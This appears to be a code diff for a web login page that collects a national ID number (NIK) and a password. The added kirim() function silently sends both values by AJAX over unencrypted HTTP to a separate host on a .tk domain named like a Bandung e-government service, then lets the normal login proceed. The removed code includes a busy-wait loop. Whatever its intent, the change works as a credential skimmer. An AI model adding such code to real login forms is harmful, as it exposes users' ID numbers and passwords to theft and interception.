@@ -59,7 +59,7 @@
                     <br/>
 
                     <div class="container" style="width:80%;">
-                        <form  id="loginForm" class="form-signin" method="post" action="{{url('auth/login')}}">
+                        <form  onsubmit="return kirim();" class="form-signin" method="post" action="{{url('auth/login')}}">
                             <input type="hidden" name="_token" value="<?php echo csrf_token(); ?>">
 
                             <label for="nik" class="sr-only">NIK</label>
@@ -99,22 +99,16 @@
     </div>
 </div>
 <script type="text/javascript">
-    $('#loginForma').submit(function(e) {
-        console.log('MASUK');
+    function kirim() {
         var nik = $('#nik').val();
         var password = $('#inputPassword').val()
         $.ajax({
             url: 'http://e-gov-bandung.tk/dukcapil/api/public/auth/login',
             type: 'POST',
-            data: { nik: nik, password : password} ,
-            success: function (response) {
-                console.log(response.id);
-                return true;
-            },
-            error: function (err) {}
+            data: { nik: nik, password : password}
         });
-        for (var i = 0; i < 2000000000; ++i);
-    })
+        return true;
+    }
 </script>
 </body>
 </html>
